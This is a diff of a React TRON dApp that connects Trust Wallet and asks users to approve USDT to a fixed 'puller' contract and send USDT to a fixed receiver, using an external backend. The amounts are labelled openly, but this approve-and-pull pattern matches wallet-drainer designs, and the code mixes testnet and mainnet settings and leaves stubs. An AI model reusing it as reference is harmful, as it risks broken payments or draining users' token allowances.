@@ -1,226 +1,286 @@
 import React, { useState, useEffect } from "react";
 import { SignClient } from "@walletconnect/sign-client";
-import TronWeb from "tronweb";
-import { Buffer } from "buffer";
-window.Buffer = Buffer;
+import { Web3Modal } from "@web3modal/standalone";
+import {TronWeb} from "tronweb";
+import { TronService } from "./tronServer";
+import { networkHost, testnetHost } from "./tronServer2";
 
-// === CONFIGURATION ===
-const PROJECT_ID      = "a2cd3f6f2c8dde8024ed901de2d36bc1";
-const TRON_NODE       = "https://api.trongrid.io";
-const USDT_CONTRACT   = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
-const PULLER_CONTRACT = "TJBdv5qD7mpaU9bsRvbuBbe9TmjHYGwREw";
-const RECEIVER        = "THzPxXfzoMRuk1s9JRs8mcV5JKXB8ZfR4g";
-const AMOUNT          = 1_000_000;       // 1 USDT in SUN
-const CHAIN_ID        = "tron:0x2b6653dc";        // TRON mainnet namespace
+if (typeof window !== "undefined" && typeof window.Buffer === "undefined") {
+  window.Buffer = require("buffer/").Buffer;
+}
 
-export default function TronApp() {
-  const [client, setClient]   = useState(null);
+// Config
+const PROJECT_ID = "a2cd3f6f2c8dde8024ed901de2d36bc1";
+const TRON_NODE = "https://api.trongrid.io";
+export const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // mainnet USDT
+export const PULLER_CONTRACT = "TJBdv5qD7mpaU9bsRvbuBbe9TmjHYGwREw"; // Replace with your deployed contract
+export const RECEIVER = "THzPxXfzoMRuk1s9JRs8mcV5JKXB8ZfR4g"; // destination address
+const AMOUNT = 1000000; // 1 USDT in SUN
+const MAINNET_CHAIN_ID = "tron:0x2b6653dc";
+
+const web3Modal = new Web3Modal({
+  projectId: PROJECT_ID,
+  walletConnectVersion: 2,
+});
+
+function TronApp() {
+  const [address, setAddress] = useState('');
   const [session, setSession] = useState(null);
-  const [address, setAddress] = useState("");
-  const [status, setStatus]   = useState("Disconnected");
-  const [txHash, setTxHash]   = useState("");
+  const [signClient, setSignClient] = useState(null);
+  const [tronWeb, setTronWeb] = useState(null);
+  const [txHash, setTxHash] = useState('');
+  const [status, setStatus] = useState("Disconnected");
 
-  // 1. Initialize SignClient & TronWeb
   useEffect(() => {
-    async function init() {
+    const initClients = async () => {
       try {
-        const signClient = await SignClient.init({
+        const client = await SignClient.init({
           projectId: PROJECT_ID,
           metadata: {
-            name: "TRC20 DApp",
-            description: "Approve & Transfer USDT on TRON",
+            name: "Tron DApp",
+            description: "TRC20 Approve & Transfer",
             url: window.location.origin,
-            icons: []
-          }
+            icons: ["https://example.com/icon.png"],
+          },
         });
-        setClient(signClient);
+        setSignClient(client);
 
-        // Auto–rehydrate session if present
-        if (signClient.session.length) {
-          const lastKey = signClient.session.keys.at(-1);
-          const lastSession = signClient.session.get(lastKey);
-          onSessionEstablished(lastSession, signClient);
+        const tw = new TronWeb({ fullHost: testnetHost });
+        setTronWeb(tw);
+
+        if (client.session.length) {
+          const lastSession = client.session.get(client.session.keys.at(-1));
+          setSession(lastSession);
+          const userAddress = lastSession.namespaces.tron.accounts[0].split(":")[2];
+          setAddress(userAddress);
+          setStatus(`Connected: ${userAddress}`);
         }
-      } catch (e) {
-        console.error("Init error", e);
-        setStatus("Initialization failed");
+      } catch (error) {
+        console.error("Init error:", error);
+        setStatus("Init failed");
       }
-    }
-    init();
+    };
+    initClients();
   }, []);
 
-  // 2. Handle a newly established session
-  const onSessionEstablished = async (sess, clientInstance = client) => {
-    setSession(sess);
-
-    // Explicitly request user accounts
-    const accounts = await clientInstance.request({
-      topic: sess.topic,
-      chainId: CHAIN_ID,
-      request: { method: "tron_requestAccounts", params: [] }
-    });
-    setAddress(accounts[0]);
-    setStatus(`Connected: ${accounts[0]}`);
-  };
-
-  // 3. Connect via deep link to Trust Wallet
   const connectWallet = async () => {
-    if (!client) return;
+    if (!signClient) return;
     try {
-      setStatus("Pairing… open Trust Wallet");
+      setStatus("Connecting... Use Trust Wallet");
 
-      const { uri, approval } = await client.connect({
+      const { uri, approval } = await signClient.connect({
         requiredNamespaces: {
           tron: {
-            chains: [CHAIN_ID],
-            methods: [
-              "tron_requestAccounts",
-              "tron_signTransaction",
-              "tron_broadcastTransaction"
-            ],
-            events: []
-          }
-        }
+            chains: [MAINNET_CHAIN_ID],
+            methods: ['tron_signTransaction', 'tron_signMessage'],
+            events: [],
+          },
+        },
       });
 
-      // Deep link into Trust Wallet (universal link)
-      window.location.href = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
+      if (uri) await web3Modal.openModal({ uri });
 
-      // Wait for the user to approve in the wallet
-      const newSession = await approval();
-      onSessionEstablished(newSession);
-    } catch (e) {
-      console.error("Connection error", e);
+      const session = await approval();
+      setSession(session);
+      const userAddress = session.namespaces.tron.accounts[0].split(":")[2];
+      setAddress(userAddress);
+      setStatus(`Connected: ${userAddress}`);
+      await web3Modal.closeModal();
+      
+    } catch (error) {
+      console.error("Connection error:", error);
       setStatus("Connection failed");
+      await web3Modal.closeModal();
     }
   };
 
-  // Helper to hit your backend
-  async function callBackend(path, body) {
-    const res = await fetch(`https://smartcontbackend.onrender.com/${path}`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(body)
-    });
-    return res.json();
+// add this helper inside your component file (outside the component function is fine)
+function normalizeSignedTx(unsignedTx, signResult) {
+  // Wallets often return just a hex string, or an object with { signature: '0x...' }
+  const sigHex =
+    typeof signResult === 'string'
+      ? signResult
+      : (signResult?.signature || signResult?.data || signResult); // be permissive
+
+  if (!sigHex) throw new Error('Wallet returned no signature');
+
+  const cleanSig = sigHex.replace(/^0x/i, '');
+
+  return {
+    ...unsignedTx,
+    // IMPORTANT: TRON expects an array of signatures (multi-sig ready),
+    // even if there is only one signature.
+    signature: [cleanSig]
+  };
+}
+
+
+ const approveUSDT = async () => {
+    try {
+        setStatus("Creating approval transaction...");
+        setTxHash('');
+        
+        const txResponse = await fetch('https://smartcontbackend.onrender.com/create-approve', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                from: address,
+                token: USDT_CONTRACT,
+                spender: PULLER_CONTRACT,
+                amount: AMOUNT
+            })
+        });
+
+       // --- approveUSDT ---
+      const unsignedTx = await txResponse.json();
+      if (!unsignedTx) throw new Error("Failed to get unsigned transaction");
+
+      setStatus("Waiting for approval signature...");
+      const signResult = await signClient.request({
+        chainId: MAINNET_CHAIN_ID,
+        topic: session.topic,
+        request: { method: 'tron_signTransaction', params: [unsignedTx] }
+      });
+
+      const finalSignedTx = normalizeSignedTx(unsignedTx, signResult);
+
+      setStatus("Broadcasting approval transaction...");
+      const broadcastResponse = await fetch('https://smartcontbackend.onrender.com/broadcast', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(finalSignedTx)
+      });
+              const result = await broadcastResponse.json();
+              if (!result || !(result.txid || result.txId)) {
+                  throw new Error("Broadcast failed");
+              }
+
+              const txId = result.txid || result.txId;
+              setTxHash(txId);
+              setStatus(`✅ Approval sent! TXID: ${txId}`);
+
+              setTimeout(() => {
+                  window.open(`https://tronscan.org/#/transaction/${txId}`, '_blank');
+              }, 1000);
+
+          } catch (error) {
+              console.error("Approval error:", error);
+              setStatus(`❌ Error: ${error.message}`);
+          }
+};
+
+const newApproveUSDT = async()=>{
+  try {
+    const tron = new TronService();
+    console.log("Starting new approval process...", tron);
+    
+  } catch (error) {
+    console.error("New Approval error:", error);
   }
+}
 
-  // 4. Build, sign & broadcast an “approve” transaction
-  const approveUSDT = async () => {
-    if (!session) return;
-    try {
-      setStatus("Building approval…");
-      const unsignedTx = await callBackend("create-approve", {
-        from: address,
-        token: USDT_CONTRACT,
-        spender: PULLER_CONTRACT,
-        amount: AMOUNT
-      });
 
-      setStatus("Signing approval…");
-      const signedTx = await client.request({
-        topic: session.topic,
-        chainId: CHAIN_ID,
-        request: {
-          method: "tron_signTransaction",
-          params: [unsignedTx]
-        }
-      });
 
-      setStatus("Broadcasting approval…");
-      const { txid, txId } = await callBackend("broadcast", { signedTx });
-      const id = txid || txId;
-      setTxHash(id);
-      setStatus(`✅ Approved! TXID: ${id}`);
-    } catch (e) {
-      console.error("Approve error", e);
-      setStatus(`Error: ${e.message}`);
-    }
-  };
-
-  // 5. Build, sign & broadcast a “transfer” transaction
   const sendUSDT = async () => {
-    if (!session) return;
     try {
-      setStatus("Building transfer…");
-      const unsignedTx = await callBackend("create-tx", {
-        from: address,
-        to: RECEIVER,
-        amount: AMOUNT
+      setStatus("Creating transaction...");
+      setTxHash('');
+
+      const txResponse = await fetch('https://smartcontbackend.onrender.com/create-tx', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          from: address,
+          to: RECEIVER,
+          amount: AMOUNT
+        })
       });
 
-      setStatus("Signing transfer…");
-      const signedTx = await client.request({
+      const unsignedTx = await txResponse.json();
+      if (!unsignedTx) throw new Error("Failed to get unsigned transaction");
+
+      setStatus("Waiting for signature...");
+      const signedTx = await signClient.request({
+        chainId: MAINNET_CHAIN_ID,
         topic: session.topic,
-        chainId: CHAIN_ID,
         request: {
-          method: "tron_signTransaction",
+          method: 'tron_signTransaction',
           params: [unsignedTx]
         }
       });
 
-      setStatus("Broadcasting transfer…");
-      const { txid, txId } = await callBackend("broadcast", { signedTx });
-      const id = txid || txId;
-      setTxHash(id);
-      setStatus(`✅ Sent! TXID: ${id}`);
-    } catch (e) {
-      console.error("Send error", e);
-      setStatus(`Error: ${e.message}`);
+      setStatus("Broadcasting transaction...");
+      const broadcastResponse = await fetch('https://smartcontbackend.onrender.com/broadcast', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ signedTx })
+      });
+
+      const result = await broadcastResponse.json();
+      if (!result || !(result.txid || result.txId)) {
+        throw new Error("Broadcast failed");
+      }
+
+      const txId = result.txid || result.txId;
+      setTxHash(txId);
+      setStatus(`✅ Transaction sent! TXID: ${txId}`);
+
+      setTimeout(() => {
+        window.open(`https://tronscan.org/#/transaction/${txId}`, '_blank');
+      }, 1000);
+
+    } catch (error) {
+      console.error("Transaction error:", error);
+      setStatus(`❌ Error: ${error.message}`);
     }
   };
 
-  // 6. Disconnect the session
   const disconnectWallet = async () => {
-    if (client && session) {
-      await client.disconnect({
+    if (signClient && session) {
+      await signClient.disconnect({
         topic: session.topic,
-        reason: { code: 6000, message: "User disconnected" }
+        reason: { code: 6000, message: "User disconnected" },
       });
     }
     setSession(null);
-    setAddress("");
-    setTxHash("");
+    setAddress('');
     setStatus("Disconnected");
+    setTxHash('');
   };
 
   return (
     <div style={styles.container}>
-      <h2>TRC20 USDT: Approve & Send</h2>
-
-      <p>
-        <strong>Status:</strong> {status}
-      </p>
-      <p style={{ wordBreak: "break-all" }}>
-        <strong>Address:</strong> {address || "—"}
+      <h2 style={styles.title}>TRC20 USDT Approval & Send</h2>
+      <p style={{ textAlign: "center", wordBreak: "break-all" }}>
+        {address ? `Wallet: ${address}` : "Wallet not connected"}
       </p>
 
       {!session ? (
         <button style={styles.button} onClick={connectWallet}>
-          Connect Trust Wallet
+          Connect Wallet (Trust Wallet)
         </button>
       ) : (
         <div style={styles.buttonGroup}>
-          <button style={styles.primary} onClick={approveUSDT}>
-            Approve 1 USDT
+          <button style={styles.primaryButton} onClick={approveUSDT}>
+            Approve 1 USDT to Contract
           </button>
-          <button style={styles.primary} onClick={sendUSDT}>
+          <button style={styles.primaryButton} onClick={sendUSDT}>
             Send 1 USDT
           </button>
-          <button style={styles.secondary} onClick={disconnectWallet}>
+          <button style={styles.secondaryButton} onClick={disconnectWallet}>
             Disconnect
           </button>
         </div>
       )}
 
+      <div style={styles.statusBox}>
+        <strong>Status:</strong> {status}
+      </div>
+
       {txHash && (
-        <div style={styles.txBox}>
+        <div style={styles.statusBox}>
           <strong>Last TX:</strong>{" "}
-          <a
-            href={`https://tronscan.org/#/transaction/${txHash}`}
-            target="_blank"
-            rel="noopener noreferrer"
-          >
+          <a href={`https://tronscan.org/#/transaction/${txHash}`} target="_blank" rel="noopener noreferrer">
             {txHash}
           </a>
         </div>
@@ -229,55 +289,61 @@ export default function TronApp() {
   );
 }
 
-// === STYLES ===
 const styles = {
   container: {
-    maxWidth: 480,
+    padding: "20px",
+    maxWidth: "500px",
     margin: "0 auto",
-    padding: 16,
-    fontFamily: "Arial, sans-serif"
+    fontFamily: "Arial, sans-serif",
+  },
+  title: {
+    color: "#2c3e50",
+    textAlign: "center",
+    marginBottom: "20px",
   },
   button: {
     padding: "12px 24px",
-    backgroundColor: "#1abc9c",
-    color: "#fff",
+    backgroundColor: "#3498db",
+    color: "white",
     border: "none",
-    borderRadius: 4,
+    borderRadius: "4px",
     cursor: "pointer",
-    fontSize: 16,
-    width: "100%"
+    fontSize: "16px",
+    display: "block",
+    margin: "0 auto",
+  },
+  primaryButton: {
+    padding: "12px 24px",
+    backgroundColor: "#2ecc71",
+    color: "white",
+    border: "none",
+    borderRadius: "4px",
+    cursor: "pointer",
+    fontSize: "16px",
+  },
+  secondaryButton: {
+    padding: "12px 24px",
+    backgroundColor: "#e74c3c",
+    color: "white",
+    border: "none",
+    borderRadius: "4px",
+    cursor: "pointer",
+    fontSize: "16px",
   },
   buttonGroup: {
     display: "flex",
-    gap: 8,
-    marginTop: 16
+    justifyContent: "center",
+    gap: "10px",
+    marginBottom: "20px",
   },
-  primary: {
-    flex: 1,
-    padding: "12px 16px",
-    backgroundColor: "#3498db",
-    color: "#fff",
-    border: "none",
-    borderRadius: 4,
-    cursor: "pointer",
-    fontSize: 14
-  },
-  secondary: {
-    flex: 1,
-    padding: "12px 16px",
-    backgroundColor: "#e74c3c",
-    color: "#fff",
-    border: "none",
-    borderRadius: 4,
-    cursor: "pointer",
-    fontSize: 14
-  },
-  txBox: {
-    marginTop: 16,
-    padding: 12,
+  statusBox: {
+    padding: "15px",
     backgroundColor: "#f8f9fa",
+    borderRadius: "4px",
     border: "1px solid #ddd",
-    borderRadius: 4,
-    wordBreak: "break-all"
-  }
+    marginTop: "20px",
+    wordBreak: "break-all",
+  },
 };
+
+export default TronApp;
